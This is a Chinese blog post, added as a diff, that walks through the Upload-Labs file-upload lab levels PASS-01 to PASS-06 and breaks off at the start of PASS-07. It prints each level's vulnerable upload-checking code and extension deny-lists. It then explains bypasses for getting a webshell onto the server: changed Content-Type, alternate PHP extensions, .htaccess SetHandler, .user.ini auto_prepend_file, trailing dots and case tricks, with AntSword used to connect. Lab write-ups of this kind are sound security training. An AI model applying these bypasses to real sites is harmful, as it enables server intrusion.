@@ -1,0 +1,1952 @@
+<!DOCTYPE html>
+<html lang="zh-hans">
+
+<head>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-16x16.png" />
+<link rel="manifest" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/site.webmanifest" />
+<link rel="mask-icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/safari-pinned-tab.svg" color="#8aa2d3" />
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon.ico" />
+<meta name="theme-color" content="#ffffff" />
+
+
+<title>Upload Labs全关详解 - Phoenix-Pl’s Blog</title>
+
+
+<meta name="author" content="DSRKafuU" />
+
+
+<meta name="description" content="A minimal Hugo theme with nice theme color." />
+
+
+
+<meta property="og:title" content="Upload Labs全关详解" />
+<meta name="twitter:title" content="Upload Labs全关详解" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Phoenix-Pl.github.io/post/upload-labs%E5%85%A8%E5%85%B3%E8%AF%A6%E8%A7%A3/" /><meta property="og:description" content="PS:这只是个菜鸟的小小记录，参考很多大佬的博客，有什么不正确的地方欢迎指正 PASS-01 解题思路:（绕开前端JS验证） 尝试：首先先挂了代理想上传个php用Burp抓个包看看，但是还没抓到包就提示该文件不允许上传" />
+<meta name="twitter:description" content="PS:这只是个菜鸟的小小记录，参考很多大佬的博客，有什么不正确的地方欢迎指正 PASS-01 解题思路:（绕开前端JS验证） 尝试：首先先挂了代理想上传个php用Burp抓个包看看，但是还没抓到包就提示该文件不允许上传" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://Phoenix-Pl.github.io/img/og.png" /><meta property="article:published_time" content="2021-04-05T16:22:32+08:00" /><meta property="article:modified_time" content="2021-04-05T16:22:32+08:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+<link rel="stylesheet" href="https://Phoenix-Pl.github.io/assets/css/fuji.min.css" />
+
+
+
+
+
+</head>
+
+<body data-theme="auto">
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://Phoenix-Pl.github.io/">Phoenix-Pl’s Blog</a>
+            
+            <span class="title-sub">书山有路勤为径，学海无涯苦作舟</span>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://Phoenix-Pl.github.io/post/upload-labs%E5%85%A8%E5%85%B3%E8%AF%A6%E8%A7%A3/">Upload Labs全关详解</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2021-04-05</span><span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;17783 字</span><span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;无标签</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <p>PS:这只是个菜鸟的小小记录，参考很多大佬的博客，有什么不正确的地方欢迎指正</p>
+<h3 id="pass-01">PASS-01</h3>
+<p>解题思路:（<strong>绕开前端JS验证</strong>）</p>
+<p>尝试：首先先挂了代理想上传个php用Burp抓个包看看，但是还没抓到包就提示该文件不允许上传，猜想应该是前段JS验证</p>
+<p>贴一下代码：</p>
+<pre><code class="language-php">function checkFile() {
+    var file = document.getElementsByName('upload_file')[0].value;
+    if (file == null || file == &quot;&quot;) {
+        alert(&quot;请选择要上传的文件!&quot;);
+        return false;
+    }
+    //定义允许上传的文件类型
+    var allow_ext = &quot;.jpg|.png|.gif&quot;;
+    //提取上传文件的类型
+    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
+    //判断上传文件类型是否允许上传
+    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {
+        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+        alert(errMsg);
+        return false;
+    }
+}
+
+</code></pre>
+<p>部分代码解释：</p>
+<pre><code class="language-php">var //用来定义变量
+alert //js函数，功能是弹出对话框并显示其中的内容
+substring //jsp函数，用于提取字符串中介于两个指定下标之间的字符。
+file.substring(file.lastIndexOf(&quot;.&quot;));//提取file变量·后面的字母，也就是后缀
+substring：提取A到B之间的字符，jsp函数
+string.substring (from A, to B)
+lastIndexOf( ) ：返回指定的字符串值最后出现的位置，如果指定第二个参数 start，则在一个字符串中的指定位置从后向前搜索。没有找到返回-1。
+indexOf() ：返回指定的字符串值在字符串中首次出现的位置。如果没有找到匹配的字符串则返回 -1。
+file_exists() ：检查文件或目录是否存在
+语法：file_exists ( string $filename )
+$filename：文件或目录的路径
+（1）、查找字符串 &quot;runoob&quot; 最后出现的位置:（**lastindexOf**）
+var str=&quot;I am from runoob，welcome to runoob site.&quot;;
+var n=str.lastIndexOf(&quot;runoob&quot;);
+//输出28
+（2）、查找字符串 &quot;welcome&quot;:（**indexOf**）
+var str=&quot;Hello world, welcome to the universe.&quot;;
+var n=str.indexOf(&quot;welcome&quot;);
+//输出 13
+</code></pre>
+<p>1、方法一（F12修改表单）
+打开F12，找到上传部分，发现==CheckFile函数==，直接将这==onsubmit==将<code>onsubmit事件</code>删除即可，使点提交(submit)后不会被调用CheckFile函数进行检查就好</p>
+<p>CheckFile函数： 为asp实现检查某一文件是否存在的代码
+onsubmit事件: onsubmit 事件会在表单中的确认按钮被点击时发生</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921195600491.png#pic_center" alt="在这里插入图片描述" />
+
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921195628669.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后直接上传一句话木马php文件即可，接着蚁剑连接</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921195656709.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921195718424.png#pic_center" alt="在这里插入图片描述" />
+2、方法二（将PHP文件后缀改成允许上传的后缀，抓包改回php）</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921195807775.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921195831222.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921195907171.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092119592745.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921195956866.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921200024828.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-02">PASS-02</h3>
+<p><strong>解题思路</strong>：（MIME验证）（ content-type 检测）
+贴一下代码</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '文件类型不正确，请重新上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p>这里解释一下MIME:
+你一定听说过<strong>文件内容类型</strong>或者说通过==抓包==你一定听说过 <strong>Content-Type</strong>: text/html 这种类似的，其实，这就是MIME。</p>
+<p>MIME(（Multipurpose Internet Mail  Extensions）多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 Image等,后面定义具体的种类。</p>
+<p>常见的MME类型，例如：</p>
+<ul>
+<li>
+<p>超文本标记语言文本 .html,html text/htm</p>
+</li>
+<li>
+<p>普通文本  .txt text/plain</p>
+</li>
+<li>
+<p>RTF文本. rtf application/rtf</p>
+</li>
+<li>
+<p>GIF图形 .gif image/gif</p>
+</li>
+<li>
+<p>JPEG图形 . jpg image/jpeg</p>
+</li>
+</ul>
+<p>函数解释：</p>
+<pre><code class="language-php">strrchr ()： 查找指定字符在字符串中的最后一次出现
+语法：strrchr ( string $haystack , mixed $needle )
+$haystack：被查找的字符串
+$needle：出现的部分字符串
+该函数返回needle在 haystack 字符串中的最后一次出现的位置后面haystack一部分，
+
+拓展：
+strstr() - 查找字符串的首次出现
+strrpos() - 计算指定字符串在目标字符串中最后一次出现的位置
+
+
+</code></pre>
+<p>下面回到这个题
+<strong>姿势一</strong>：将webshell 文件的后缀名改为图片类型 ，再利用 bs 抓包 修改文件后缀</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921200254191.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921200314546.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921200339169.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921200354467.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092120042174.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>姿势二</strong>：直接上传 webshell 文件 ，利用 bs 修改 Content-type ：为 image/gif  绕过</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092120065158.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092120071247.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921200736450.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921200802117.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-03">PASS-03</h3>
+<p><strong>解题思路</strong>：黑名单验证，特殊后缀
+<strong>这里贴一下源码</strong>：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array('.asp','.aspx','.php','.jsp');
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if(!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
+            if (move_uploaded_file($temp_file,$img_path)) {
+                 $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+
+</code></pre>
+<p><strong>部分代码解释</strong>：</p>
+<pre><code class="language-php">(1)trim() //函数移除字符串两侧的空白字符或其他预定义字符。
+相关函数：
+ltrim() - 移除字符串左侧的空白字符或其他预定义字符
+rtrim() - 移除字符串右侧的空白字符或其他预定义字符
+详情:https://www.w3school.com.cn/php/func_string_trim.asp
+(2)deldot($file_name);//删除文件名末尾的点
+(3)strrchr() // 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。
+    实例:
+	&lt;?php  //搜索 &quot;What&quot; 在字符串中的位置，并返回从该位置到字符串结尾的所有字符
+	echo strrchr(&quot;Hello world! What a beautiful day!&quot;,What); 
+	?&gt;
+    输出:What a beautiful day! 
+详情:https://www.w3school.com.cn/php/func_string_strrchr.asp
+(4)strtolower() // 函数把字符串转换为小写。
+(5)str_ireplace() //函数替换字符串中的一些字符（不区分大小写）。
+   该函数必须遵循下列规则：
+   
+   如果搜索的字符串是一个数组，那么它将返回一个数组。
+   如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。
+   如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换
+   如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。
+注释：该函数不区分大小写。请使用 str_replace() 函数来执行区分大小写的搜索。
+注释：该函数是二进制安全的。
+    
+    语法:str_ireplace(find,replace,string,count)
+    --------------------------------------------
+    |find         |必需。规定要查找的值。   	   |
+    --------------------------------------------
+    |replace      |必需。规定替换 find 中的值的值。|
+    --------------------------------------------
+    |string       |必需。规定被搜索的字符串。      |
+    --------------------------------------------
+    |count        |可选。一个变量，对替换数进行计数 |
+    --------------------------------------------  
+
+
+</code></pre>
+<p><strong>源码分析</strong>：</p>
+<ul>
+<li>
+<p>黑名单不全，想使用大小写、‘.’号（如：1.php.）、特殊字符（如：1.php::$DATA）、Apache文件后缀解析（1.php.xxx为1.php）等方式绕过，但查看源码后，发现都给过滤掉了。
+<strong>解题姿势一</strong>：
+使用一些特殊的后缀：</p>
+</li>
+<li>
+<p>php：php3、php4、phtml</p>
+</li>
+<li>
+<p>jsp：jspx、jspf</p>
+</li>
+<li>
+<p>asp：asa、cer</p>
+</li>
+<li>
+<p>使用特殊后缀之后，发现还是不行，返回结果为空，测试<code>&lt;?php phpinfo();?&gt;</code>也读不出来。看wp和百度后，是由于环境是phpstudy搭建的，里面把后缀给限制了，所以改一下httpd.conf文件里的<code>#AddType application/x-httpd-php .php .phtml</code>为<code>AddType application/x-httpd-php .php .phtml .php3 .php4</code>
+==记得去掉<code>#</code>号。==</p>
+<p><strong>但是</strong>：我是用V8.0的phpstudy,发现 <code>httpd.conf</code> 文件里居然没有上述代码，通过查资料发现，找到这些代码
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921201043858.png#pic_center" alt="在这里插入图片描述" />
+
+在 <code>&lt;/IfMndule&gt;</code>上面添加以下代码<code>AddType application/x-httpd-php .php .phtml .php3</code></p>
+</li>
+</ul>
+<p>==但是== 是我想的太简单了，加上依旧无法解析php3，查了一下apache的版本号是==2.4.39==，我又用phpstudy2018尝试了一下Apache的版本号是==2.4.23==（由于2018版没有直接写出版本号，可以执行cmd命令行查看   切到phpstudy/apache/bin   目录。执行httpd -v可查看版本号），旧版本就会出现<code>#AddType application/x-httpd-php .php .phtml</code>这些代码，具体原因目前还不知道&hellip;就先使用2018版</p>
+<p><strong>回到题目</strong>
+这里我们试一下php3，将webshell的后缀改成.php3，上传成功后复制上传地址，蚁剑连接</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092120114436.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921201310433.png#pic_center" alt="在这里插入图片描述" />
+<strong>解题姿势二</strong>：
+上传图片马，然后BP拦截，修改后缀为phtml,php3,php4,php5,pht</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921201407826.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921201427104.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>蚁剑连接</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921201508901.png#pic_center" alt="在这里插入图片描述" />
+<strong>解题姿势三</strong>：(.htaccess绕过)</p>
+<p><strong>这个有好多坑好多坑好多坑</strong></p>
+<p>首先，我一开始用的是phpstudy V8.0搭建的，然后发现即使按照百度上的方法，即：</p>
+<blockquote>
+<p>Apache要使.htaccess文件生效要在httpd.config 配置两个地方(百度搜的)</p>
+<p>Options FollowSymLinks</p>
+<p>AllowOverride None</p>
+<p>改为：</p>
+<p>Options FollowSymLinks AllowOverride All</p>
+<p>把LoadModule rewrite_module modules/mod_rewrite.so前面的注释符号#删除</p>
+</blockquote>
+<p>依旧还是不行，试了好久好久&hellip;
+终于！！！找到了这个大佬的博客   <a href="https://www.zhaosimeng.cn/zqzb/55.html" target="_blank">链接</a>.</p>
+<p>里面详尽的讲了为什么新版不行，所以我换了phpstudy 2018版</p>
+<p><strong>但是</strong>，这个题好像无法使用.htaccess绕过，为什么呢？因为通过查资料发现，使用.htaccess绕过来讲其他后缀解析为php是需要没有前缀的，只需要.htaccess这个文件（也就是<code>.</code>前面是没有任何东西的）</p>
+<p>但是这道题的有一行代码是这样的</p>
+<pre><code class="language-php">$img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+</code></pre>
+<p>这里会通过上传日期来命名上传文件的，也就是得到的是个xxx.htaccess文件，这样的话就无法解析其他后缀为php了</p>
+<h3 id="pass-04">PASS-04</h3>
+<p>这里先贴一下代码</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件不允许上传!';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p>代码和PASS-03差距不大，就不做过多解释</p>
+<p><strong>解题思路</strong>：黑名单验证，<code>.htaccess</code>绕过，相比于PASS-03，黑名单更加多了，使用.htaccess绕过</p>
+<blockquote>
+<p>Apache要使.htaccess文件生效要在httpd.config 配置两个地方(百度搜的)</p>
+<p>Options FollowSymLinks</p>
+<p>AllowOverride None</p>
+<p>改为：</p>
+<p>Options FollowSymLinks AllowOverride All</p>
+<p>把LoadModule rewrite_module modules/mod_rewrite.so前面的注释符号#删除</p>
+</blockquote>
+<p><strong>解题姿势一</strong>：
+先上传一个.htaccess文件，内容如下：</p>
+<p><code>SetHandler application/x-httpd-php </code></p>
+<p>这样所有文件都会当成php来解析</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921203700453.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092120370968.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后再上传一个图片马，复制地址，蚁剑连接</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921203814573.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921203824670.png#pic_center" alt="在这里插入图片描述" />
+<strong>解题姿势二</strong>：
+<strong>后缀修改为：点+空+点</strong>
+上传图片马，BP抓包，然后将图片马后缀 <strong>.png</strong> 改为 <strong>.php +点+空+点</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921214918746.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921214937450.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-05">PASS-05</h3>
+<p>贴一下代码</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+
+</code></pre>
+<p>代码也和上一关差不多，不做解释了</p>
+<p><strong>解题思路</strong>：黑名单验证，<code>.user.ini.</code></p>
+<ul>
+<li>
+<p>与前两关相似，再过滤了.htaccess，但是还有个ini配置文件可以利用。</p>
+</li>
+<li>
+<p>先上传一个以<code>auto_prepend_file=1.png</code>为内容的<code>.user.ini</code>文件，然后再上传一个内容为php的一句话的脚本，命名为<code>1.png</code>，<code>.user.ini</code>文件里的意思是：==所有的php文件都自动包含1.png文件。.user.ini相当于一个用户自定义的php.ini。==</p>
+</li>
+<li>
+<p>提示是：存在readme.php这个文件。<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921212640376.png#pic_center" alt="在这里插入图片描述" />
+</p>
+</li>
+<li>
+<p>复制图像地址后，将文件名改为==readme.php==，然后密码设置为一句话的密码，蚁剑连接成功。</p>
+</li>
+</ul>
+<p><strong>注</strong>：这里php版本要高一些才能使用
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201017100222516.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后蚁剑连接，成功</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201017100323485.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-06">PASS-06</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p>这里代码和上面是一个类型的
+<strong>解题思路</strong>：大小写绕过</p>
+<p>由以上代码可知，源码中<strong>没有</strong>==对后缀名进行统一转换为大小写==，所以在本关中，在BP拦截后，将图片马后缀名改为 <strong>Php</strong>（这么依情况而定，不段的<strong>按照图片后缀名大小</strong>写去尝试即可 ）</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921220425939.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921220434235.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-07">PASS-07</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
